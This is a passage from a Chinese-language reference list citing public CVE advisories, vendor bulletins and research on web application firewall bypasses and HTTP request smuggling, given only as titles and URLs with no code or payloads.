3. **CVE-2023-50969 Imperva WAF 绕过 PoC** — https://www.hoyahaxa.com/2024/03/imperva-waf-bypass-cve-2023-50969.html
4. **CVE-2023-38285 ModSecurity DoS 漏洞** — https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-v3-dos-vulnerability-in-four-transformations-cve-2023-38285/
5. **CVE-2023-38199 CRS 多 Content-Type 绕过** — https://coreruleset.org/20230717/cve-2023-38199-multiple-content-type-headers/
6. **AWS 安全公告 CVE-2026-13762** — https://aws.amazon.com/security/security-bulletins/2026-048-aws/
7. **Akamai Ghost CVE-2025-66373 技术公告** — https://www.akamai.com/blog/security/cve-2025-66373-http-request-smuggling-chunked-body-size
8. **Akamai Ghost CVE-2025-32094 技术公告** — https://www.akamai.com/blog/security/cve-2025-32094-http-request-smuggling
9. **WAFFLED: WAF 解析差异研究** — https://arxiv.org/html/2503.10846v1 （学术论文，覆盖多款 WAF 的解析差异分析）
10. **Sysdig AWS WAF 绕过研究** — https://www.sysdig.com/blog/fuzzing-and-bypassing-the-aws-waf
11. **NVD CVE 数据库** — https://nvd.nist.gov/vuln/detail/
12. **PortSwigger HTTP Desync 研究** — https://portswigger.net/web-security/request-smuggling
13. **Decryption Digest WAF 绕过技术指南** — https://www.decryptiondigest.com/blog/waf-bypass-techniques-detection-rule-tuning